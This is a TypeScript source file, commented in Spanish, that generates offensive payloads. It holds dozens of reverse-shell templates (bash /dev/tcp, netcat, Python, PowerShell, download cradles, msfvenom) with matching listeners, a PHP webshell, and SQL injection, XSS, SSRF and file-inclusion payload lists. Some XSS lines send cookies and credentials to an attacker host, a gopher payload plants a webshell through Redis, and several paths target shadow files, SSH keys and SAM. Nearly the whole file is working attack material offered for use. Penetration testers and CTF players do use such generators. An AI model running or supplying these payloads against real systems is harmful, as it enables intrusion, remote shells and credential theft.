/* Generadores de payloads: reverse shells, injection, XSS, SSRF, LFI, fuzzing, enumeración web */

export interface RevShellTemplate {
  name: string
  category: string
  os: 'linux' | 'windows' | 'multi'
  command: (ip: string, port: string) => string
}

const L = (ip: string, port: string) => ({ ip, port })

export const REV_SHELLS: RevShellTemplate[] = [
  // Linux / Unix
  { name: 'Bash TCP', category: 'Linux', os: 'linux', command: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1` },
  { name: 'Bash UDP', category: 'Linux', os: 'linux', command: (i, p) => `bash -i >& /dev/udp/${i}/${p} 0>&1` },
  { name: 'Bash -i FIFO', category: 'Linux', os: 'linux', command: (i, p) => `0<&196;exec 196<>/dev/tcp/${i}/${p}; sh <&196 >&196 2>&196` },
  { name: 'mkfifo (sh)', category: 'Linux', os: 'linux', command: (i, p) => `mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ${i} ${p} > /tmp/f` },
  { name: 'nc -e', category: 'Linux', os: 'linux', command: (i, p) => `nc -e /bin/bash ${i} ${p}` },
  { name: 'nc (sin -e)', category: 'Linux', os: 'linux', command: (i, p) => `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${i} ${p} >/tmp/f` },
  { name: 'ncat TLS', category: 'Linux', os: 'linux', command: (i, p) => `ncat --ssl ${i} ${p} -e /bin/bash` },
  { name: 'socat', category: 'Linux', os: 'linux', command: (i, p) => `socat TCP:${i}:${p} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane` },
  { name: 'Perl', category: 'Scripting', os: 'linux', command: (i, p) => `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { name: 'Ruby', category: 'Scripting', os: 'linux', command: (i, p) => `ruby -rsocket -e 'f=TCPSocket.open("${i}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
  { name: 'Lua TCP', category: 'Scripting', os: 'linux', command: (i, p) => `lua -e "require('socket');require('os');t=assert(socket.tcp());t:connect('${i}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
  { name: 'Golang', category: 'Compilados', os: 'linux', command: (i, p) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${i}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
  { name: 'Java', category: 'Compilados', os: 'multi', command: (i, p) => `Runtime rt = Runtime.getRuntime();\nString[] commands = {"/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"};\nProcess proc = rt.exec(commands);` },
  { name: 'C (compilar en target)', category: 'Compilados', os: 'linux', command: (i, p) => `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\nint main(){int s;struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons(${p});a.sin_addr.s_addr=inet_addr("${i}");s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execve("/bin/sh",NULL,NULL);return 0;}` },
  // Python y PHP
  { name: 'Python 3', category: 'Scripting', os: 'multi', command: (i, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { name: 'Python 3 (PTY full)', category: 'Scripting', os: 'linux', command: (i, p) => `python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'` },
  { name: 'Python 2', category: 'Scripting', os: 'multi', command: (i, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` },
  { name: 'PHP exec', category: 'Web', os: 'multi', command: (i, p) => `php -r '$sock=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { name: 'PHP system', category: 'Web', os: 'multi', command: (i, p) => `php -r '$s=fsockopen("${i}",${p});system("sh -i <&3 >&3 2>&3");'` },
  { name: 'PHP one-liner webshell', category: 'Web', os: 'multi', command: () => `<?php system($_GET['cmd']); ?>` },
  // Windows
  { name: 'PowerShell #1', category: 'Windows', os: 'windows', command: (i, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
  { name: 'PowerShell (base64)', category: 'Windows', os: 'windows', command: (i, p) => `# Codifica primero: toBase64(powershell -nop -c "...")\npowershell -nop -w hidden -enc <BASE64_AQUI>  # payload TCPClient a ${i}:${p}` },
  { name: 'PowerShell IEX cradle', category: 'Windows', os: 'windows', command: (i, p) => `iex(New-Object Net.WebClient).DownloadString('http://${i}:${p}/shell.ps1')` },
  { name: 'PowerShell DNS TXT', category: 'Windows', os: 'windows', command: (i) => `iex((nslookup -q=txt ${i}).' -join(''))` },
  { name: 'Certutil (descarga)', category: 'Windows', os: 'windows', command: (i, p) => `certutil.exe -urlcache -split -f http://${i}:${p}/payload.exe C:\\Windows\\Temp\\p.exe` },
  { name: 'MSBuild LOLBin', category: 'Windows', os: 'windows', command: (i, p) => `msbuild.exe p.xml /p:WORKING_DIRECTORY=C:\\Windows\\Temp  # proyecto inline que conecta a ${i}:${p}` },
  { name: 'Windows netcat', category: 'Windows', os: 'windows', command: (i, p) => `nc.exe ${i} ${p} -e cmd.exe` },
  { name: 'Cmd (nc -e via telnet)', category: 'Windows', os: 'windows', command: (i, p) => `echo open ${i} ${p} > t.txt & echo GET /x.exe >> t.txt & ftp -s:t.txt x.exe` },
  // Herramientas
  { name: 'MSFVenom Linux x64', category: 'Herramientas', os: 'linux', command: (i, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${i} LPORT=${p} -f elf -o rev.elf` },
  { name: 'MSFVenom Windows x64', category: 'Herramientas', os: 'windows', command: (i, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${i} LPORT=${p} -f exe -o rev.exe` },
  { name: 'MSFVenom Python', category: 'Herramientas', os: 'multi', command: (i, p) => `msfvenom -p cmd/unix/reverse_python LHOST=${i} LPORT=${p} -f raw` },
  { name: 'MSFVenom PHP', category: 'Herramientas', os: 'multi', command: (i, p) => `msfvenom -p php/reverse_php LHOST=${i} LPORT=${p} -o shell.php` },
  { name: 'MSFVenom ASPX', category: 'Herramientas', os: 'windows', command: (i, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${i} LPORT=${p} -f aspx -o rev.aspx` },
  { name: 'MSFVenom JSP (Java web)', category: 'Herramientas', os: 'multi', command: (i, p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${i} LPORT=${p} -f raw -o rev.jsp` },
  { name: 'MSFVenom War (Tomcat)', category: 'Herramientas', os: 'multi', command: (i, p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${i} LPORT=${p} -f war -o rev.war` },
  { name: 'MSFVenom APK (Android)', category: 'Herramientas', os: 'multi', command: (i, p) => `msfvenom -p android/meterpreter/reverse_tcp LHOST=${i} LPORT=${p} -o rev.apk` },
  { name: 'MSFVenom PowerShell', category: 'Herramientas', os: 'windows', command: (i, p) => `msfvenom -p windows/x64/exec CMD='powershell -ep bypass -e <B64>' -f psh -o rev.ps1  # LHOST=${i} LPORT=${p}` },
]

export function listeners(ip: string, port: string): { name: string; cmd: string }[] {
  const v = L(ip, port)
  return [
    { name: 'nc ( básico)', cmd: `nc -lvnp ${v.port}` },
    { name: 'rlwrap + nc (flechas/historial)', cmd: `rlwrap -cAr nc -lvnp ${v.port}` },
    { name: 'ncat TLS', cmd: `ncat --ssl -lvnp ${v.port}` },
    { name: 'socat PTY completo', cmd: `socat file:$(tty),raw,echo=0 TCP-L:${v.port}` },
    { name: 'pwncat', cmd: `pwncat-cs -lp ${v.port}` },
    { name: 'Metasploit multi/handler', cmd: `msfconsole -q -x "use exploit/multi/handler; set LHOST ${v.ip}; set LPORT ${v.port}; set ExitOnSession false; run"` },
    { name: 'impacket smbserver (compartir)', cmd: `impacket-smbserver share . -smb2support` },
    { name: 'Servidor HTTP rápido', cmd: `python3 -m http.server ${v.port}` },
  ]
}

/* ---------------- Web payloads ---------------- */

export const SQLI_PAYLOADS: { name: string; payloads: string[] }[] = [
  {
    name: 'Detección / bypass login',
    payloads: [
      "' OR '1'='1' -- -",
      '" OR "1"="1" -- -',
      "' OR 1=1-- -",
      "admin'-- -",
      "' OR 1=1#",
      "1' ORDER BY 1-- -",
      "' UNION SELECT NULL-- -",
      "' UNION SELECT NULL,NULL-- -",
      "' UNION SELECT NULL,NULL,NULL-- -",
    ],
  },
  {
    name: 'MySQL',
    payloads: [
      "' UNION SELECT @@version,NULL-- -",
      "' UNION SELECT user(),database()-- -",
      "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
      "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
      "' UNION SELECT username,password FROM users-- -",
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      "1' AND SLEEP(5)-- -",
      "1' AND BENCHMARK(5000000,MD5('a'))-- -",
      "1; SHOW DATABASES-- -",
    ],
  },
  {
    name: 'PostgreSQL',
    payloads: [
      "' UNION SELECT version(),NULL-- -",
      "' UNION SELECT current_user,current_database()-- -",
      "' UNION SELECT tablename,NULL FROM pg_tables-- -",
      "' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -",
      "'; SELECT pg_sleep(5)-- -",
      "' UNION SELECT NULL,NULL FROM pg_sleep(5)-- -",
      "1;COPY (SELECT '') TO PROGRAM 'id'-- -",
    ],
  },
  {
    name: 'SQLite',
    payloads: [
      "' UNION SELECT sqlite_version(),NULL-- -",
      "' UNION SELECT name,sql FROM sqlite_master-- -",
      "' UNION SELECT 1,(SELECT group_concat(tbl_name) FROM sqlite_master)-- -",
      "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -",
    ],
  },
  {
    name: 'MSSQL',
    payloads: [
      "' UNION SELECT @@version,NULL-- -",
      "' UNION SELECT DB_NAME(),NULL-- -",
      "' UNION SELECT name,NULL FROM sys.databases-- -",
      "'; WAITFOR DELAY '0:0:5'-- -",
      "'; EXEC xp_cmdshell 'whoami'-- -",
      "'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -",
      "1'; EXEC master..xp_dirtree '\\\\attacker\\share'-- -",
    ],
  },
  {
    name: 'Oracle',
    payloads: [
      "' UNION SELECT banner,NULL FROM v$version-- -",
      "' UNION SELECT user,NULL FROM dual-- -",
      "' UNION SELECT table_name,NULL FROM all_tables-- -",
      "' UNION SELECT NULL,NULL FROM dual WHERE 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a')-- -",
    ],
  },
]

export const XSS_PAYLOADS: { name: string; payloads: string[] }[] = [
  {
    name: 'Básicos / detección',
    payloads: [
      '<script>alert(1)</script>',
      '<script>alert("XSS")</script>',
      '"><script>alert(1)</script>',
      '\'><script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<details open ontoggle=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<marquee onstart=alert(1)>x</marquee>',
    ],
  },
  {
    name: 'Event handlers / bypass',
    payloads: [
      '<svg/onload=alert(1)>',
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      '<ScRiPt>alert(1)</sCrIpT>',
      '<script >alert(1)</script >',
      '<script\\u0020>alert(1)</script>',
      '<img src="x" ONERROR="alert(1)">',
      '<img src=x onerror=alert&lpar;1&rpar;>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
      '<form><button formaction=javascript&colon;alert(1)>X</button>',
      '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    ],
  },
  {
    name: 'Sin paréntesis ni comillas',
    payloads: [
      '<svg onload=alert`1>`',
      '<svg onload=alert&lpar;1&rpar;>',
      '<script>onerror=alert;throw 1</script>',
      '<script>throw/**/onerror=eval,\'alert\\x281\\x29\'</script>',
      '<script>{onerror=alert}throw 1</script>',
    ],
  },
  {
    name: 'HTMLi / robo de credenciales',
    payloads: [
      '<form action="http://ATTACKER/capture"><input name=u placeholder="usuario"><input name=p type=password placeholder="contraseña"><input type=submit></form>',
      '<input autofocus onfocus=fetch("http://ATTACKER/?c="+document.cookie)>',
      '<img src=x onerror="new Image().src=\'http://ATTACKER/?c=\'+document.cookie">',
      '<svg onload="location=\'http://ATTACKER/?c=\'+document.cookie">',
    ],
  },
  {
    name: 'Blind / SSRF-ish',
    payloads: [
      '<link rel=stylesheet href=http://ATTACKER/x.css>',
      '<object data="http://ATTACKER/x.html">',
      '<embed src="http://ATTACKER/x.swf">',
      '<meta http-equiv="refresh" content="0;url=http://ATTACKER/">',
      '<script src="http://ATTACKER/x.js"></script>',
    ],
  },
]

export const SSRF_PAYLOADS: string[] = [
  'http://127.0.0.1',
  'http://localhost',
  'http://127.0.0.1:8080',
  'http://127.0.0.1:3306',
  'http://[::1]',
  'http://0.0.0.0',
  'http://0177.0.0.1',
  'http://2130706433',
  'http://0x7f000001',
  'http://169.254.169.254/latest/meta-data/', // AWS metadata
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://169.254.169.254/metadata/v1/', // DigitalOcean
  'http://100.100.100.200/latest/meta-data/', // Alibaba
  'file:///etc/passwd',
  'file:///c:/windows/win.ini',
  'gopher://127.0.0.1:6379/_%0d%0aCONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0d%0aSAVE%0d%0a',
  'dict://127.0.0.1:6379/INFO',
  'http://internal-service.local',
  'http://10.0.0.1/admin',
  'http://192.168.1.1/',
]

export const LFI_PAYLOADS: string[] = [
  '/etc/passwd',
  '../../../../etc/passwd',
  '....//....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '/etc/shadow',
  '/etc/hosts',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/proc/1/environ',
  '/var/log/apache2/access.log',
  '/var/log/nginx/access.log',
  '/var/log/auth.log',
  '/root/.bash_history',
  '/home/*/.ssh/id_rsa',
  'php://filter/convert.base64-encode/resource=index.php',
  'php://filter/convert.base64-encode/resource=/etc/passwd',
  'php://input',
  'data://text/plain,<?php system($_GET[0]);?>',
  'expect://id',
  '/etc/crontab',
  '/etc/mysql/my.cnf',
  '/etc/apache2/apache2.conf',
  '/etc/nginx/nginx.conf',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  'C:\\Windows\\win.ini',
  'C:\\Windows\\repair\\SAM',
  'C:\\xampp\\apache\\conf\\httpd.conf',
  '..\\..\\..\\..\\windows\\win.ini',
]

export const FUZZ_LISTS: { name: string; words: string[] }[] = [
  { name: 'Paths comunes', words: ['admin', 'administrator', 'backup', 'backups', 'db', 'config', 'conf', 'api', 'v1', 'v2', 'test', 'tests', 'dev', 'staging', 'old', 'temp', 'tmp', '.git', '.env', '.htaccess', 'robots.txt', 'sitemap.xml', 'phpinfo.php', 'info.php', 'server-status', 'wp-admin', 'wp-login.php', 'administrator', 'login', 'signin', 'dashboard', 'console', 'shell', 'cmd', 'uploads', 'upload', 'files', 'static', 'assets', 'media', 'private', 'internal', 'secret', 'hidden'] },
  { name: 'Extensiones peligrosas', words: ['.php', '.php5', '.phtml', '.asp', '.aspx', '.jsp', '.jspx', '.cgi', '.pl', '.py', '.sh', '.bak', '.old', '.orig', '.save', '.swp', '.swo', '.sql', '.sqlite', '.db', '.zip', '.tar', '.tar.gz', '.rar', '.7z', '.txt', '.log', '.yml', '.yaml', '.json', '.xml', '.conf', '.ini', '.env'] },
  { name: 'Parámetros interesantes', words: ['debug', 'test', 'admin', 'root', 'user', 'id', 'uid', 'pid', 'file', 'path', 'page', 'dir', 'folder', 'cmd', 'exec', 'run', 'action', 'view', 'edit', 'delete', 'remove', 'create', 'upload', 'download', 'import', 'export', 'redirect', 'url', 'uri', 'next', 'return', 'returnTo', 'callback', 'continue', 'target', 'dest', 'redirect_uri', 'q', 'search', 'query', 'filter', 'sort', 'order', 'token', 'secret', 'key', 'password', 'email', 'username'] },
  { name: 'Subdominios frecuentes', words: ['www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 'ns2', 'dns', 'vpn', 'api', 'dev', 'test', 'staging', 'uat', 'qa', 'prod', 'app', 'portal', 'admin', 'dashboard', 'panel', 'cpanel', 'plesk', 'git', 'gitlab', 'jenkins', 'ci', 'cd', 'docker', 'k8s', 'kubernetes', 'db', 'sql', 'mysql', 'postgres', 'redis', 'mongo', 'elastic', 'grafana', 'kibana', 'prometheus', 'monitor', 'nagios', 'zabbix', 'jira', 'confluence', 'wiki', 'docs', 'doc', 's3', 'storage', 'bucket', 'cdn', 'static', 'assets', 'img', 'images', 'media', 'video', 'files', 'download', 'backup', 'bak', 'old', 'legacy', 'beta', 'alpha', 'demo', 'sandbox', 'internal', 'intranet', 'corporate', 'office', 'remote', 'rdp', 'ssh', 'sso', 'auth', 'login', 'oauth', 'id', 'identity', 'account', 'billing', 'pay', 'payment', 'shop', 'store', 'blog', 'news', 'forum', 'community', 'support', 'help', 'status', 'health'] },
]
